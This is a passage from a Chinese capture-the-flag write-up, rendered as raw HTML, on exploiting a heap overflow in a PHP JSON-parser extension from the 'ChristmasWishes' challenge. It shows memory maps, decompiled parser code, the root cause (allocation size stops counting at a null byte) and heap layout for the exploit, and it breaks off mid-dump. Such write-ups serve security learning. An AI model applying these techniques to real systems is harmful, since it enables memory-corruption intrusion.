class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74dead2000<span class="number">-7f</span>74dead5000 rw-p <span class="number">001b</span>d000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74dead5000<span class="number">-7f</span>74deadb000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7f</span>74deade000<span class="number">-7f</span>74deadf000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deadf000<span class="number">-7f</span>74deaff000 r-xp <span class="number">00001000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deaff000<span class="number">-7f</span>74deb07000 r--p <span class="number">00021000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deb08000<span class="number">-7f</span>74deb09000 r--p <span class="number">00029000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deb09000<span class="number">-7f</span>74deb0a000 rw-p <span class="number">0002</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deb0a000<span class="number">-7f</span>74deb0b000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7f</span>fd989a4000<span class="number">-7f</span>fd989c5000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">7f</span>fd989d9000<span class="number">-7f</span>fd989dd000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [vvar]</span><br><span class="line"><span class="number">7f</span>fd989dd000<span class="number">-7f</span>fd989df000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                  [vsyscall]</span><br></pre></td></tr></table></figure>
<p><strong>信息收集：本地</strong></p>
<p><code>gdb php vmmp</code> 可以也获取本地 libc_base：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x401000</span>           <span class="number">0x402000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x402000</span>           <span class="number">0x403000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x403000</span>           <span class="number">0x404000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x404000</span>           <span class="number">0x405000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x405000</span>           <span class="number">0x426000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7db7000</span>     <span class="number">0x7ffff7dba000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      [anon_7ffff7db7]</span><br><span class="line">    <span class="number">0x7ffff7dba000</span>     <span class="number">0x7ffff7ddc000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ddc000</span>     <span class="number">0x7ffff7f54000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7f54000</span>     <span class="number">0x7ffff7fa2000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fa2000</span>     <span class="number">0x7ffff7fa6000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fa6000</span>     <span class="number">0x7ffff7fa8000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fa8000</span>     <span class="number">0x7ffff7fac000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      [anon_7ffff7fa8]</span><br><span class="line">    <span class="number">0x7ffff7fac000</span>     <span class="number">0x7ffff7fad000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fad000</span>     <span class="number">0x7ffff7faf000</span> r-xp     <span class="number">2000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7faf000</span>     <span class="number">0x7ffff7fb0000</span> r--p     <span class="number">1000</span> <span class="number">3000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fb0000</span>     <span class="number">0x7ffff7fb1000</span> r--p     <span class="number">1000</span> <span class="number">3000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fb1000</span>     <span class="number">0x7ffff7fb2000</span> rw-p     <span class="number">1000</span> <span class="number">4000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fb2000</span>     <span class="number">0x7ffff7fb4000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      [anon_7ffff7fb2]</span><br><span class="line">    <span class="number">0x7ffff7fc2000</span>     <span class="number">0x7ffff7fc4000</span> r--p     <span class="number">2000</span> <span class="number">0</span>      /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc4000</span>     <span class="number">0x7ffff7fc6000</span> r-xp     <span class="number">2000</span> <span class="number">2000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc6000</span>     <span class="number">0x7ffff7fc7000</span> r--p     <span class="number">1000</span> <span class="number">4000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc7000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">1000</span> <span class="number">4000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">1000</span> <span class="number">5000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7ffff7ffe]</span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>通过 <code>ldd --version</code> 可以查看 libc 版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ChristmasWishes ldd --<span class="function">version</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ldd</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> 2.31</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2020 自由软件基金会。</span></span><br><span class="line"><span class="function">这是一个自由软件；请见源代码的授权条款。本软件不含任何没有担保；甚至不保证适销性</span></span><br><span class="line"><span class="function">或者适合某些特殊目的。</span></span><br><span class="line"><span class="function">由 Roland McGrath 和 Ulrich Drepper 编写。</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>函数 new_Value 就是 jsonparser.so 中处理字符的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">new_Value</span><span class="params">(__int64 read)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> next; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)Read_isEnd(read) == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  next = Read_next(read);</span><br><span class="line">  <span class="keyword">switch</span> ( next )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> new_String(read); <span class="comment">// String</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> new_Object(read); <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> new_Array(read); <span class="comment">// Array</span></span><br><span class="line">  &#125;</span><br><span class="line">  --*(_DWORD *)(read + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)inNumber((<span class="keyword">unsigned</span> <span class="keyword">int</span>)next) ) <span class="comment">// Integer</span></span><br><span class="line">    <span class="keyword">return</span> new_Number(read);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)isFalse(read) ) <span class="comment">// Boolean</span></span><br><span class="line">    <span class="keyword">return</span> new_False();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)isTure(read) ) <span class="comment">// Boolean</span></span><br><span class="line">    <span class="keyword">return</span> new_True();</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)isNull(read) ) <span class="comment">// NULL</span></span><br><span class="line">    error_read(read, <span class="string">&quot;parse value&quot;</span>); </span><br><span class="line">  <span class="keyword">return</span> new_Null();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Switch-case 和 if 的处理，刚好对应了 PHP 的几种数据类型：</p>
<ul>
<li>String（字符串）</li>
<li>Integer（整型）</li>
<li>Float（浮点型）</li>
<li>Boolean（布尔型）</li>
<li>Array（数组）</li>
<li>Object（对象）</li>
<li>NULL（空值）</li>
<li>Resource（资源类型）</li>
</ul>
<p>漏洞点就在 <code>new_String-&gt;parser_string</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">parser_string</span><span class="params">(__int64 read)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *chunk_s1; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s2; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s3; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s4; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s6; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s7; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *read_ptr_temp2; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *chunk_s8; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *read_ptr; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *read_ptr2; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *read_ptr_temp; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  _BYTE *ret_s; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  _BYTE *ret; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  read_ptr = (_BYTE *)(*(_QWORD *)read + *(<span class="keyword">int</span> *)(read + <span class="number">12</span>));</span><br><span class="line">  <span class="keyword">for</span> ( read_ptr_temp = read_ptr; *read_ptr_temp != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; *read_ptr_temp; ++read_ptr_temp )</span><br><span class="line">    ;                                           <span class="comment">// 遍历read,直到read_ptr_temp指向&#x27;&quot;&#x27;或者NULL</span></span><br><span class="line">  ret_s = <span class="built_in">malloc</span>((<span class="keyword">int</span>)read_ptr_temp - (<span class="keyword">int</span>)read_ptr + <span class="number">1</span>);<span class="comment">// 计算read的长度,分配内存</span></span><br><span class="line">  ret = ret_s;</span><br><span class="line">  <span class="keyword">while</span> ( *read_ptr != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; *read_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *read_ptr != <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">    v1 = (<span class="keyword">char</span>)*++read_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk_s1 = ret_s++;</span><br><span class="line">      *chunk_s1 = <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">      <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="string">&#x27;&quot;&#x27;</span> || v1 &gt; <span class="string">&#x27;u&#x27;</span> || v1 &lt; <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">key:</span><br><span class="line">      ++read_ptr;                               <span class="comment">// 普通字符直接复制进ret_s</span></span><br><span class="line"><span class="keyword">break</span>:</span><br><span class="line">      read_ptr_temp2 = read_ptr++;</span><br><span class="line">      chunk_s8 = ret_s++;</span><br><span class="line">      *chunk_s8 = *read_ptr_temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *read_ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">          chunk_s2 = ret_s++;</span><br><span class="line">          *chunk_s2 = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">          chunk_s3 = ret_s++;</span><br><span class="line">          *chunk_s3 = <span class="string">&#x27;\b&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">          chunk_s4 = ret_s++;</span><br><span class="line">          *chunk_s4 = <span class="string">&#x27;\f&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">          chunk_s5 = ret_s++;</span><br><span class="line">          *chunk_s5 = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">          chunk_s6 = ret_s++;</span><br><span class="line">          *chunk_s6 = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">          chunk_s7 = ret_s++;</span><br><span class="line">          *chunk_s7 = <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:                              </span><br><span class="line">          read_ptr2 = read_ptr + <span class="number">1</span>;</span><br><span class="line">          hex_parse(ret_s, read_ptr2);</span><br><span class="line">          ret_s += <span class="number">2</span>;</span><br><span class="line">          read_ptr = read_ptr2 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> key;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *ret_s = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(read + <span class="number">12</span>) = (_DWORD)read_ptr - *(_QWORD *)read + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我先吐槽一下 IDA 的反编译，IDA 总喜欢把 break 弄成 goto 看着很刺眼，IDA 还会搞一堆莫名其妙的变量（其实都是同一个东西），本人逆向很菜鸡，暂时不知道怎么改</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( read_ptr_temp = read_ptr; *read_ptr_temp != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; *read_ptr_temp; ++read_ptr_temp )</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret_s = <span class="built_in">malloc</span>((<span class="keyword">int</span>)read_ptr_temp - (<span class="keyword">int</span>)read_ptr + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>按照程序的逻辑：malloc 申请的大小由 read_ptr_temp 和 read_ptr 确定，但是 read_ptr_temp 的遍历可以被 \x00 截断</li>
<li>这就导致了：malloc 申请的大小 &lt; 实际写入的大小，造成堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>有一个堆溢出，那么最好覆盖一个结构体</p>
<p>经过多次调试，得到如下堆布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">json = </span><br><span class="line">&#123;&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    <span class="string">&quot;2&quot;</span>: <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    <span class="string">&quot;3&quot;</span>: <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405f30</span> <span class="comment">/* info struct */</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405f80</span> <span class="comment">/* name */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405fa0</span> <span class="comment">/* data */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405fc0</span> <span class="comment">/* info struct */</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x406010</span> <span class="comment">/* name */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x406030</span> <span class="comment">/* data */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x405fc0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x405fc0</span> ◂— <span class="number">0x0</span> <span class="comment">/* info struct */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x405fc8</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x405fd0</span> —▸ <span class="number">0x405fb0</span> ◂— <span class="number">0x61616161616161</span> <span class="comment">/* &#x27;aaaaaaa&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x405fd8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x405fe0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x405fe8</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x405ff0</span> —▸ <span class="number">0x405f90</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x405ff8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x406000</span> —▸ <span class="number">0x406060</span> —▸ <span class="number">0x406040</span> ◂— <span class="number">0x61616161616161</span> <span class="comment">/* &#x27;aaaaaaa&#x27; */</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x406008</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x406010</span> ◂— <span 